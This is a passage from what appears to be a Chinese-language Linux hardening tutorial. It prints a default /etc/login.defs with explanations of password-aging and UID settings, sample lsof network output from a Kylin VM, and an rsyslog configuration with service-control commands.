SYSLOG_SG_ENAB does the same for newgrp and sg.</span><br><span class="line">#</span><br><span class="line">SYSLOG_SU_ENAByes</span><br><span class="line">SYSLOG_SG_ENAByes</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># If defined, all su activity is logged to this file.</span><br><span class="line">#</span><br><span class="line">#SULOG_FILE/var/log/sulog</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># If defined, file which maps tty line to TERM environment parameter.</span><br><span class="line"># Each line of the file is in a format something like &quot;vt100  tty01&quot;.</span><br><span class="line">#</span><br><span class="line">#TTYTYPE_FILE/etc/ttytype</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># If defined, login failures will be logged here in a utmp format</span><br><span class="line"># last, when invoked as lastb, will read /var/log/btmp, so...</span><br><span class="line">#</span><br><span class="line">FTMP_FILE/var/log/btmp</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># If defined, the command name to display when running &quot;su -&quot;.  For</span><br><span class="line"># example, if this is defined as &quot;su&quot; then a &quot;ps&quot; will display the</span><br><span class="line"># command is &quot;-su&quot;.  If not defined, then &quot;ps&quot; would display the</span><br><span class="line"># name of the shell actually being run, e.g. something like &quot;-sh&quot;.</span><br><span class="line">#</span><br><span class="line">SU_NAMEsu</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># If defined, file which inhibits all the usual chatter during the login</span><br><span class="line"># sequence.  If a full pathname, then hushed mode will be enabled if the</span><br><span class="line"># user&#x27;s name or shell are found in the file.  If not a full pathname, then</span><br><span class="line"># hushed mode will be enabled if the file exists in the user&#x27;s home directory.</span><br><span class="line">#</span><br><span class="line">HUSHLOGIN_FILE.hushlogin</span><br><span class="line">#HUSHLOGIN_FILE/etc/hushlogins</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># *REQUIRED*  The default PATH settings, for superuser and normal users.</span><br><span class="line">#</span><br><span class="line"># (they are minimal, add the rest in the shell startup files)</span><br><span class="line">ENV_SUPATHPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">ENV_PATHPATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Terminal permissions</span><br><span class="line">#</span><br><span class="line">#TTYGROUPLogin tty will be assigned this group ownership.</span><br><span class="line">#TTYPERMLogin tty will be set to this permission.</span><br><span class="line">#</span><br><span class="line"># If you have a &quot;write&quot; program which is &quot;setgid&quot; to a special group</span><br><span class="line"># which owns the terminals, define TTYGROUP to the group number and</span><br><span class="line"># TTYPERM to 0620.  Otherwise leave TTYGROUP commented out and assign</span><br><span class="line"># TTYPERM to either 622 or 600.</span><br><span class="line">#</span><br><span class="line"># In Debian /usr/bin/bsd-write or similar programs are setgid tty</span><br><span class="line"># However, the default and recommended value for TTYPERM is still 0600</span><br><span class="line"># to not allow anyone to write to anyone else console or terminal</span><br><span class="line"></span><br><span class="line"># Users can still allow other people to write them by issuing </span><br><span class="line"># the &quot;mesg y&quot; command.</span><br><span class="line"></span><br><span class="line">TTYGROUPtty</span><br><span class="line">TTYPERM0600</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Login configuration initializations:</span><br><span class="line">#</span><br><span class="line">#ERASECHARTerminal ERASE character (&#x27;\010&#x27; = backspace).</span><br><span class="line">#KILLCHARTerminal KILL character (&#x27;\025&#x27; = CTRL/U).</span><br><span class="line">#UMASKDefault &quot;umask&quot; value.</span><br><span class="line">#</span><br><span class="line"># The ERASECHAR and KILLCHAR are used only on System V machines.</span><br><span class="line"># </span><br><span class="line"># UMASK is the default umask value for pam_umask and is used by</span><br><span class="line"># useradd and newusers to set the mode of the new home directories.</span><br><span class="line"># 022 is the &quot;historical&quot; value in Debian for UMASK</span><br><span class="line"># 027, or even 077, could be considered better for privacy</span><br><span class="line"># There is no One True Answer here : each sysadmin must make up his/her</span><br><span class="line"># mind.</span><br><span class="line">#</span><br><span class="line"># If USERGROUPS_ENAB is set to &quot;yes&quot;, that will modify this UMASK default value</span><br><span class="line"># for private user groups, i. e. the uid is the same as gid, and username is</span><br><span class="line"># the same as the primary group name: for these, the user permissions will be</span><br><span class="line"># used as group permissions, e. g. 022 will become 002.</span><br><span class="line">#</span><br><span class="line"># Prefix these values with &quot;0&quot; to get octal, &quot;0x&quot; to get hexadecimal.</span><br><span class="line">#</span><br><span class="line">ERASECHAR0177</span><br><span class="line">KILLCHAR025</span><br><span class="line">UMASK022</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Password aging controls:</span><br><span class="line">#</span><br><span class="line">#PASS_MAX_DAYSMaximum number of days a password may be used.</span><br><span class="line">#PASS_MIN_DAYSMinimum number of days allowed between password changes.</span><br><span class="line">#PASS_WARN_AGENumber of days warning given before a password expires.</span><br><span class="line">#</span><br><span class="line">PASS_MAX_DAYS99999</span><br><span class="line">PASS_MIN_DAYS0</span><br><span class="line">PASS_WARN_AGE7</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Min/max values for automatic uid selection in useradd</span><br><span class="line">#</span><br><span class="line">UID_MIN 1000</span><br><span class="line">UID_MAX60000</span><br><span class="line"># System accounts</span><br><span class="line">#SYS_UID_MIN  100</span><br><span class="line">#SYS_UID_MAX  999</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Min/max values for automatic gid selection in groupadd</span><br><span class="line">#</span><br><span class="line">GID_MIN 1000</span><br><span class="line">GID_MAX60000</span><br><span class="line"># System accounts</span><br><span class="line">#SYS_GID_MIN  100</span><br><span class="line">#SYS_GID_MAX  999</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Max number of login retries if password is bad. This will most likely be</span><br><span class="line"># overriden by PAM, since the default pam_unix module has it&#x27;s own built</span><br><span class="line"># in of 3 retries. However, this is a safe fallback in case you are using</span><br><span class="line"># an authentication module that does not enforce PAM_MAXTRIES.</span><br><span class="line">#</span><br><span class="line">LOGIN_RETRIES5</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Max time in seconds for login</span><br><span class="line">#</span><br><span class="line">LOGIN_TIMEOUT60</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Which fields may be changed by regular users using chfn - use</span><br><span class="line"># any combination of letters &quot;frwh&quot; (full name, room number, work</span><br><span class="line"># phone, home phone).  If not defined, no changes are allowed.</span><br><span class="line"># For backward compatibility, &quot;yes&quot; = &quot;rwh&quot; and &quot;no&quot; = &quot;frwh&quot;.</span><br><span class="line"># </span><br><span class="line">CHFN_RESTRICTrwh</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Should login be allowed if we can&#x27;t cd to the home directory?</span><br><span class="line"># Default in no.</span><br><span class="line">#</span><br><span class="line">DEFAULT_HOMEyes</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># If defined, this command is run when removing a user.</span><br><span class="line"># It should remove any at/cron/print jobs etc. owned by</span><br><span class="line"># the user to be removed (passed as the first argument).</span><br><span class="line">#</span><br><span class="line">#USERDEL_CMD/usr/sbin/userdel_local</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Enable setting of the umask group bits to be the same as owner bits</span><br><span class="line"># (examples: 022 -&gt; 002, 077 -&gt; 007) for non-root users, if the uid is</span><br><span class="line"># the same as gid, and username is the same as the primary group name.</span><br><span class="line">#</span><br><span class="line"># If set to yes, userdel will remove the user&#x27;s group if it contains no</span><br><span class="line"># more members, and useradd will create by default a group with the name</span><br><span class="line"># of the user.</span><br><span class="line">#</span><br><span class="line">USERGROUPS_ENAB yes</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Instead of the real user shell, the program specified by this parameter</span><br><span class="line"># will be launched, although its visible name (argv[0]) will be the shell&#x27;s.</span><br><span class="line"># The program may do whatever it wants (logging, additional authentification,</span><br><span class="line"># banner, ...) before running the actual shell.</span><br><span class="line">#</span><br><span class="line"># FAKE_SHELL /bin/fakeshell</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># If defined, either full pathname of a file containing device names or</span><br><span class="line"># a &quot;:&quot; delimited list of device names.  Root logins will be allowed only</span><br><span class="line"># upon these devices.</span><br><span class="line">#</span><br><span class="line"># This variable is used by login and su.</span><br><span class="line">#</span><br><span class="line">#CONSOLE/etc/consoles</span><br><span class="line">#CONSOLEconsole:tty01:tty02:tty03:tty04</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># List of groups to add to the user&#x27;s supplementary group set</span><br><span class="line"># when logging in on the console (as determined by the CONSOLE</span><br><span class="line"># setting).  Default is none.</span><br><span class="line">#</span><br><span class="line"># Use with caution - it is possible for users to gain permanent</span><br><span class="line"># access to these groups, even when not logged in on the console.</span><br><span class="line"># How to do it is left as an exercise for the reader...</span><br><span class="line">#</span><br><span class="line"># This variable is used by login and su.</span><br><span class="line">#</span><br><span class="line">#CONSOLE_GROUPSfloppy:audio:cdrom</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># If set to &quot;yes&quot;, new passwords will be encrypted using the MD5-based</span><br><span class="line"># algorithm compatible with the one used by recent releases of FreeBSD.</span><br><span class="line"># It supports passwords of unlimited length and longer salt strings.</span><br><span class="line"># Set to &quot;no&quot; if you need to copy encrypted passwords to other systems</span><br><span class="line"># which don&#x27;t understand the new algorithm.  Default is &quot;no&quot;.</span><br><span class="line">#</span><br><span class="line"># This variable is deprecated. You should use ENCRYPT_METHOD.</span><br><span class="line">#</span><br><span class="line">#MD5_CRYPT_ENABno</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># If set to MD5 , MD5-based algorithm will be used for encrypting password</span><br><span class="line"># If set to SHA256, SHA256-based algorithm will be used for encrypting password</span><br><span class="line"># If set to SHA512, SHA512-based algorithm will be used for encrypting password</span><br><span class="line"># If set to DES, DES-based algorithm will be used for encrypting password (default)</span><br><span class="line"># Overrides the MD5_CRYPT_ENAB option</span><br><span class="line">#</span><br><span class="line"># Note: It is recommended to use a value consistent with</span><br><span class="line"># the PAM modules configuration.</span><br><span class="line">#</span><br><span class="line">ENCRYPT_METHOD SHA512</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Only used if ENCRYPT_METHOD is set to SHA256 or SHA512.</span><br><span class="line">#</span><br><span class="line"># Define the number of SHA rounds.</span><br><span class="line"># With a lot of rounds, it is more difficult to brute forcing the password.</span><br><span class="line"># But note also that it more CPU resources will be needed to authenticate</span><br><span class="line"># users.</span><br><span class="line">#</span><br><span class="line"># If not specified, the libc will choose the default number of rounds (5000).</span><br><span class="line"># The values must be inside the 1000-999999999 range.</span><br><span class="line"># If only one of the MIN or MAX values is set, then this value will be used.</span><br><span class="line"># If MIN &gt; MAX, the highest value will be used.</span><br><span class="line">#</span><br><span class="line"># SHA_CRYPT_MIN_ROUNDS 5000</span><br><span class="line"># SHA_CRYPT_MAX_ROUNDS 5000</span><br><span class="line"></span><br><span class="line">################# OBSOLETED BY PAM ##############</span><br><span class="line">##</span><br><span class="line"># These options are now handled by PAM. Please#</span><br><span class="line"># edit the appropriate file in /etc/pam.d/ to#</span><br><span class="line"># enable the equivelants of them.</span><br><span class="line">#</span><br><span class="line">###############</span><br><span class="line"></span><br><span class="line">#MOTD_FILE</span><br><span class="line">#DIALUPS_CHECK_ENAB</span><br><span class="line">#LASTLOG_ENAB</span><br><span class="line">#MAIL_CHECK_ENAB</span><br><span class="line">#OBSCURE_CHECKS_ENAB</span><br><span class="line">#PORTTIME_CHECKS_ENAB</span><br><span class="line">#SU_WHEEL_ONLY</span><br><span class="line">#CRACKLIB_DICTPATH</span><br><span class="line">#PASS_CHANGE_TRIES</span><br><span class="line">#PASS_ALWAYS_WARN</span><br><span class="line">#ENVIRON_FILE</span><br><span class="line">#NOLOGINS_FILE</span><br><span class="line">#ISSUE_FILE</span><br><span class="line">#PASS_MIN_LEN</span><br><span class="line">#PASS_MAX_LEN</span><br><span class="line">#ULIMIT</span><br><span class="line">#ENV_HZ</span><br><span class="line">#CHFN_AUTH</span><br><span class="line">#CHSH_AUTH</span><br><span class="line">#FAIL_DELAY</span><br><span class="line"></span><br><span class="line">################# OBSOLETED #######################</span><br><span class="line">#  #</span><br><span class="line"># These options are no more handled by shadow.    #</span><br><span class="line">#                                                 #</span><br><span class="line"># Shadow utilities will display a warning if they #</span><br><span class="line"># still appear.                                   #</span><br><span class="line">#                                                 #</span><br><span class="line">###################################################</span><br><span class="line"></span><br><span class="line"># CLOSE_SESSIONS</span><br><span class="line"># LOGIN_STRING</span><br><span class="line"># NO_PASSWORD_CONSOLE</span><br><span class="line"># QMAIL_DIR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以使用文本编辑器（如 Vi 编辑器）打开 <code>/etc/login.defs</code> 文件进行查看和编辑。以下是一些可能在该文件中找到的常见设置：</p><ul><li><code>PASS_MAX_DAYS</code>：定义用户密码的最大有效天数。</li><li><code>PASS_MIN_DAYS</code>：定义用户必须保持密码的最小天数。</li><li><code>PASS_WARN_AGE</code>：定义在密码过期之前提前多少天向用户发出警告。</li><li><code>UID_MIN</code> 和 <code>UID_MAX</code>：定义用户的最小和最大 UID 值。</li><li><code>GID_MIN</code> 和 <code>GID_MAX</code>：定义组的最小和最大 GID 值。</li><li><code>LOGIN_RETRIES</code>：定义用户登录失败的最大尝试次数。</li><li><code>LOGIN_TIMEOUT</code>：定义用户登录超时的时间（以秒为单位）。</li><li><code>UMASK</code>：定义新创建文件和目录的默认权限掩码。</li><li><code>ENV_PATH</code>：定义用户登录时使用的默认环境变量路径。</li></ul><p>请注意，对 <code>/etc/login.defs</code> 文件进行更改可能会对系统的安全性和用户体验产生影响。在编辑该文件之前，建议先备份原始文件，并确保您了解所做更改的后果。</p><p>更详细的关于 <code>/etc/login.defs</code> 文件的说明可以在 Linux 系统的文档或手册中找到。您可以使用 <code>man login.defs</code> 命令来查看相关的手册页。</p><h2 id="远程登陆取消telnet采用ssh"><a href="#远程登陆取消telnet采用ssh" class="headerlink" title="远程登陆取消telnet采用ssh"></a>远程登陆取消telnet采用ssh</h2><h3 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h3><p><code>lsof</code> 是一个用于列出打开文件和网络连接的命令，它可以显示系统中当前打开的文件和网络连接的相关信息。下面是 <code>lsof</code> 命令的一些常见用法和选项：</p><ul><li><code>lsof -i</code>：列出所有的网络连接信息。</li><li><code>lsof -i :&lt;port&gt;</code>：列出指定端口号的网络连接信息。</li><li><code>lsof -iTCP</code> 或 <code>lsof -iUDP</code>：只列出 TCP 或 UDP 协议的网络连接信息。</li><li><code>lsof -u &lt;username&gt;</code>：列出指定用户打开的文件和网络连接信息。</li><li><code>lsof -c &lt;command&gt;</code>：列出指定命令打开的文件和网络连接信息。</li><li><code>lsof -p &lt;pid&gt;</code>：列出指定进程 ID 打开的文件和网络连接信息。</li><li><code>lsof -i -a -c &lt;command&gt;</code>：同时使用多个选项进行过滤，例如列出指定命令的网络连接信息。</li><li><code>lsof &lt;filename&gt;</code>：列出指定文件被哪些进程打开。</li></ul><p>除了上述选项之外，<code>lsof</code> 还有其他一些用于进一步过滤和显示信息的选项。可以通过 <code>man lsof</code> 命令查看 <code>lsof</code> 的完整帮助文档，了解更多详细的用法和选项。</p><p>请注意，使用 <code>lsof</code> 命令可能需要以 root 或具有适当权限的用户身份运行，以便查看所有进程和文件的详细信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~# lsof -i</span><br><span class="line">COMMAND    PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">kyseclogd  700            root    3u  IPv4  28847      0t0  TCP *:8751 (LISTEN)</span><br><span class="line">systemd-r  702 systemd-resolve   12u  IPv4  29087      0t0  UDP localhost:domain </span><br><span class="line">systemd-r  702 systemd-resolve   13u  IPv4  29088      0t0  TCP localhost:domain (LISTEN)</span><br><span class="line">avahi-dae  812           avahi   12u  IPv4  31090      0t0  UDP *:mdns </span><br><span class="line">avahi-dae  812           avahi   13u  IPv6  31091      0t0  UDP *:mdns </span><br><span class="line">avahi-dae  812           avahi   14u  IPv4  31092      0t0  UDP *:59366 </span><br><span class="line">avahi-dae  812           avahi   15u  IPv6  31093      0t0  UDP *:38192 </span><br><span class="line">cupsd      816            root    6u  IPv6  30374      0t0  TCP ip6-localhost:ipp (LISTEN)</span><br><span class="line">cupsd      816            root    7u  IPv4  30375      0t0  TCP localhost:ipp (LISTEN)</span><br><span class="line">miracat_u  843            root    5u  IPv4  30574      0t0  TCP *:24605 (LISTEN)</span><br><span class="line">nmbd      1034            root   13u  IPv4  36274      0t0  UDP *:netbios-ns </span><br><span class="line">nmbd      1034            root   14u  IPv4  36275      0t0  UDP *:netbios-dgm </span><br><span class="line">nmbd      1034            root   15u  IPv4  61523      0t0  UDP 192.168.67.133:netbios-ns </span><br><span class="line">nmbd      1034            root   16u  IPv4  61524      0t0  UDP 192.168.67.255:netbios-ns </span><br><span class="line">nmbd      1034            root   17u  IPv4  61525      0t0  UDP 192.168.67.133:netbios-dgm </span><br><span class="line">nmbd      1034            root   18u  IPv4  61526      0t0  UDP 192.168.67.255:netbios-dgm </span><br><span class="line">xrdp-sesm 1081            root    7u  IPv6  35993      0t0  TCP ip6-localhost:3350 (LISTEN)</span><br><span class="line">charon    1085            root   10u  IPv6  37118      0t0  UDP *:isakmp </span><br><span class="line">charon    1085            root   11u  IPv6  37119      0t0  UDP *:ipsec-nat-t </span><br><span class="line">charon    1085            root   12u  IPv4  37120      0t0  UDP *:isakmp </span><br><span class="line">charon    1085            root   13u  IPv4  37121      0t0  UDP *:ipsec-nat-t </span><br><span class="line">sshd      1096            root    3u  IPv4  36016      0t0  TCP *:ssh (LISTEN)</span><br><span class="line">sshd      1096            root    4u  IPv6  36018      0t0  TCP *:ssh (LISTEN)</span><br><span class="line">dnsmasq   1112         dnsmasq    4u  IPv4  37033      0t0  UDP localhost:domain </span><br><span class="line">dnsmasq   1112         dnsmasq    5u  IPv4  37034      0t0  TCP localhost:domain (LISTEN)</span><br><span class="line">dnsmasq   1112         dnsmasq    6u  IPv6  37035      0t0  UDP ip6-localhost:domain </span><br><span class="line">dnsmasq   1112         dnsmasq    7u  IPv6  37036      0t0  TCP ip6-localhost:domain (LISTEN)</span><br><span class="line">dnsmasq   1112         dnsmasq   12u  IPv4  82440      0t0  UDP *:48169 </span><br><span class="line">dnsmasq   1112         dnsmasq   13u  IPv4  82441      0t0  UDP *:10730 </span><br><span class="line">dnsmasq   1112         dnsmasq   14u  IPv4  82478      0t0  UDP *:49769 </span><br><span class="line">dnsmasq   1112         dnsmasq   15u  IPv4  82479      0t0  UDP *:24371 </span><br><span class="line">xl2tpd    1173            root    3u  IPv4  36959      0t0  UDP *:l2f </span><br><span class="line">xrdp      1210            xrdp   11u  IPv6  59568      0t0  TCP *:ms-wbt-server (LISTEN)</span><br><span class="line">mysqld    1259           mysql   22u  IPv4  59277      0t0  TCP localhost:33060 (LISTEN)</span><br><span class="line">mysqld    1259           mysql   24u  IPv4  59335      0t0  TCP localhost:mysql (LISTEN)</span><br><span class="line">kysec-syn 1456            root    9u  IPv4  58731      0t0  TCP *:8750 (LISTEN)</span><br><span class="line">smbd      1989            root   46u  IPv6  61632      0t0  TCP *:microsoft-ds (LISTEN)</span><br><span class="line">smbd      1989            root   47u  IPv6  61633      0t0  TCP *:netbios-ssn (LISTEN)</span><br><span class="line">smbd      1989            root   48u  IPv4  61634      0t0  TCP *:microsoft-ds (LISTEN)</span><br><span class="line">smbd      1989            root   49u  IPv4  61635      0t0  TCP *:netbios-ssn (LISTEN)</span><br><span class="line">miracle-a 2114           kylin   10u  IPv4  62067      0t0  TCP *:7250 (LISTEN)</span><br><span class="line">yh-signat 2343           kylin   11u  IPv6  64559      0t0  TCP *:8668 (LISTEN)</span><br><span class="line">sshd      2834            root    4u  IPv4  67318      0t0  TCP 192.168.67.133:ssh-&gt;192.168.67.1:56246 (ESTABLISHED)</span><br><span class="line">sshd      2937           kylin    4u  IPv4  67318      0t0  TCP 192.168.67.133:ssh-&gt;192.168.67.1:56246 (ESTABLISHED)</span><br><span class="line">dhclient  3225            root    8u  IPv4  82390      0t0  UDP *:bootpc </span><br></pre></td></tr></table></figure><h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><h3 id="rsyslog"><a href="#rsyslog" class="headerlink" title="rsyslog"></a>rsyslog</h3><p>rsyslog 是一个功能强大的日志管理工具，用于收集、处理和转发系统日志。它是 Linux 系统中最常用的日志服务之一，被广泛应用于各种 Linux 发行版中。</p><p>rsyslog 可以接收来自不同来源的日志消息，如系统内核、应用程序、网络设备等，并将它们保存到本地文件或发送到远程服务器。它支持多种日志协议和格式，如 syslog、TCP、UDP、TLS、JSON 等。</p><p>rsyslog 的主要特点包括：</p><ol><li><p>灵活的配置：rsyslog 提供了丰富的配置选项，允许用户根据需要定制日志的输入源、输出目标、过滤规则和处理动作。</p></li><li><p>强大的过滤功能：rsyslog 可以根据日志内容、日志级别、日志来源等条件进行灵活的过滤，以便对日志进行精确的处理和转发。</p></li><li><p>高效的日志处理：rsyslog 使用高度优化的算法和数据结构，能够高效地处理大量的日志消息，并提供可靠的日志传输和存储机制。</p></li><li><p>安全的传输：rsyslog 支持使用 TLS/SSL 加密协议来保护日志的传输过程，确保日志的机密性和完整性。</p></li><li><p>可扩展性：rsyslog 提供了丰富的插件和模块，可以与其他工具和系统集成，如 Elasticsearch、Kafka、MySQL 等。</p></li></ol><p>在安装完 rsyslog 后，默认情况下，它会自动收集系统日志并将其保存到 <code>/var/log</code> 目录下的不同日志文件中。可以通过编辑 <code>rsyslog.conf</code> 或 <code>/etc/rsyslog.d/</code> 目录下的配置文件来修改和定制日志的处理方式。</p><p>要启动、停止或重新加载 rsyslog 服务，可以使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start rsyslog    # 启动 rsyslog 服务</span><br><span class="line">sudo systemctl stop rsyslog     # 停止 rsyslog 服务</span><br><span class="line">sudo systemctl restart rsyslog  # 重启 rsyslog 服务</span><br><span class="line">sudo systemctl reload rsyslog   # 重新加载 rsyslog 配置</span><br></pre></td></tr></table></figure><p>通过 rsyslog，您可以更好地管理和监控系统日志，以便及时发现和解决潜在的问题，并提供更好的系统可用性和安全性。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~# cat /etc/rsyslog.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> /etc/rsyslog.conf configuration file <span class="keyword">for</span> rsyslog</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># For more information install rsyslog-doc and see</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> /usr/share/doc/rsyslog-doc/html/configuration/index.html</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Default logging rules can be found in /etc/rsyslog.d/50-default.conf</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### MODULES ####</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">################</span></span></span><br><span class="line"></span><br><span class="line">module(load=&quot;imuxsock&quot;) # provides support for local system logging</span><br><span class="line"><span class="meta">#</span><span class="bash">module(load=<span class="string">&quot;immark&quot;</span>)  <span class="comment"># provides --MARK-- message capability</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> provides UDP syslog reception</span></span><br><span class="line"><span class="meta">#</span><span class="bash">module(load=<span class="string">&quot;imudp&quot;</span>)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">input(<span class="built_in">type</span>=<span class="string">&quot;imudp&quot;</span> port=<span class="string">&quot;514&quot;</span>)</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> provides TCP syslog reception</span></span><br><span class="line"><span class="meta">#</span><span class="bash">module(load=<span class="string">&quot;imtcp&quot;</span>)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">input(<span class="built_in">type</span>=<span class="string">&quot;imtcp&quot;</span> port=<span class="string">&quot;514&quot;</span>)</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> provides kernel logging support and <span class="built_in">enable</span> non-kernel klog messages</span></span><br><span class="line">module(load=&quot;imklog&quot; permitnonkernelfacility=&quot;on&quot;)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##########################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### GLOBAL DIRECTIVES ####</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##########################</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Use traditional timestamp format.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">enable</span> high precision timestamps, comment out the following line.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="variable">$ActionFileDefaultTemplate</span> RSYSLOG_TraditionalFileFormat</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Filter duplicated messages</span></span><br><span class="line"><span class="meta">$</span><span class="bash">RepeatedMsgReduction on</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Set the default permissions for all log files.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="variable">$FileOwner</span> syslog</span></span><br><span class="line"><span class="meta">$</span><span class="bash">FileGroup adm</span></span><br><span class="line"><span class="meta">$</span><span class="bash">FileCreateMode 0640</span></span><br><span class="line"><span class="meta">$</span><span class="bash">DirCreateMode 0755</span></span><br><span class="line"><span class="meta">$</span><span class="bash">Umask 0022</span></span><br><span class="line"><span class="meta">$</span><span class="bash">PrivDropToUser syslog</span></span><br><span class="line"><span class="meta">$</span><span class="bash">PrivDropToGroup syslog</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Where to place spool and state files</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="variable">$WorkDirectory</span> /var/spool/rsyslog</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Include all config files in /etc/rsyslog.d/</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="variable">$IncludeConfig</span> /etc/rsyslog.d/*.conf</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><h3 